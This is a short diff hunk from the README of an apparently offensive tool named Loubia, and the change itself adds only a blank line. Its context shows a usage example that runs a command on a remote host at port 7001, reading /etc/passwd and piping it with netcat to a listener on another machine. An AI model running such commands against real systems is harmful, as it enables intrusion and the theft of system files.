@@ -22,6 +22,7 @@ Below is the help of Loubia showing its awesome functionalities:
 		  -v, --verbose         Print verbose output. Default : false
 
 Examples:
+
 Disclosing /etc/passwd to a local listening socket
 
 		./loubia.py 192.168.1.2 7001 -c "cat /etc/passwd | nc 192.168.1.3 6666"
